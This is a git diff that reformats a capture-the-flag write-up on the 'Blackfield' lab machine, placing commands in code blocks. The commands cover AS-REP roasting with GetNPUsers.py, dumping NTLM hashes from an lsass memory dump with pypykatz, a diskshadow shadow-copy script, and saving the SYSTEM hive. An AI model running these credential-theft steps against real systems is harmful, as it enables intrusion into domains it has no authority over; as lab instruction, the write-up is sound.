@@ -74,7 +74,9 @@ we notice no files are there. But, we can still save those foldernames to be use
 
 *Having this list,* we launch an `ASREPRoast` attack using `impacket`'s `GetNPUsers.py`. 
 
-`GetNPUsers.py -dc-ip 10.10.10.192 blackfield.local/ -request -usersfile users.txt`
+```bash
+GetNPUsers.py -dc-ip 10.10.10.192 blackfield.local/ -request -usersfile users.txt
+```
 
 ![asrep-roast](/assets/Blackfield/asrep-roast.jpg)
 
@@ -175,7 +177,10 @@ we unzip the `lsass.zip` file to find a `.DMP` file which is a memory dump of th
 
 we can use a tool called `pypykatz` (https://github.com/skelsec/pypykatz) to obtain hashes from the `.DMP` files.
 
-`pypykatz lsa minidump lsass.DMP` is the command.
+**Command:** 
+```bash
+pypykatz lsa minidump lsass.DMP
+```
 
 We do a `grep` for the **NT** field for the **NTLM hash** and use the `-B` flag to get th 3 lines before it to get the usernames.
 
@@ -205,7 +210,7 @@ We will be using the `diskshadow` command line utility with the `/s` flag for sc
 
 The content should be something like:
 
-```
+```shell
 set context persistent nowriters
 add volume c: alias abuse
 create
@@ -267,7 +272,9 @@ robocopy /?
 
 we can then use the `reg` command with the `save` option to get the `SYSTEM` hive:
 
-`reg save hklm\system c:\windows\Temp\system`
+```
+reg save hklm\system c:\windows\Temp\system
+```
 
 ![got-system-hive](/assets/Blackfield/got-system-hive.jpg)
 
